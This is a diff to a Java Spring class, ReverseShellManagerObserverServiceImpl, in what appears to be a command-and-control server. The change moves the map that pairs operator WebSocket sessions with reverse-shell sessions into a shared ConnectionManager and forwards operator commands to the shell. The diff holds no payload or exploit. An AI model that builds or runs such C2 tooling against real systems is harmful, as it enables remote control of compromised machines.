@@ -9,6 +9,7 @@ import com.mtattab.c2cServer.service.Command;
 import com.mtattab.c2cServer.service.ReverseShellManagerService;
 import com.mtattab.c2cServer.service.factory.CommandFactory;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
+import com.mtattab.c2cServer.util.ConnectionManager;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.Data;
@@ -21,7 +22,7 @@ import org.springframework.web.socket.TextMessage;
 import org.springframework.web.socket.WebSocketSession;
 
 import java.util.Arrays;
-import java.util.HashMap;
+
 import java.util.List;
 import java.util.Optional;
 
@@ -39,7 +40,6 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
     @Autowired
     CommandFactory commandFactory;
 
-    HashMap<WebSocketSession , WebSocketSession > connectedSessions= new HashMap<>();
 
     @Override
     public void onApplicationEvent(MessageEventModel messageEventModels) {
@@ -49,7 +49,7 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
                 .findFirst();
 
         if (matchingEvent.isPresent()) {
-            matchingEvent.get().getEventHandler().handle(messageEventModels, activeSessionsObservable.getActiveMangerSessions(), connectedSessions);
+            matchingEvent.get().getEventHandler().handle(messageEventModels, activeSessionsObservable.getActiveMangerSessions());
         } else {
             log.error("[-] Event Not Found");
             throw new RuntimeException("Something wrong happened while handling observable change event" );
@@ -64,8 +64,8 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
     }
 
     public void handleManagerSession(WebSocketSession session, TextMessage message) {
-        System.out.println(connectedSessions);
-        if (connectedSessions.get(session)!=null){
+//        System.out.println(ConnectionManager.connectedManagerToReverseSessions);
+        if (ConnectionManager.connectedManagerToReverseSessions.get(session)!=null){
             handleConnectedManagerCommandMessage(session, message);
 
         }
@@ -101,7 +101,7 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
         String mangerMessage = message.getPayload();
 
         System.out.println("reverse shell connected");
-        WebSocketSession targetReverseShellSocket= connectedSessions.get(session);
+        WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(session);
 
         SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
                 DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
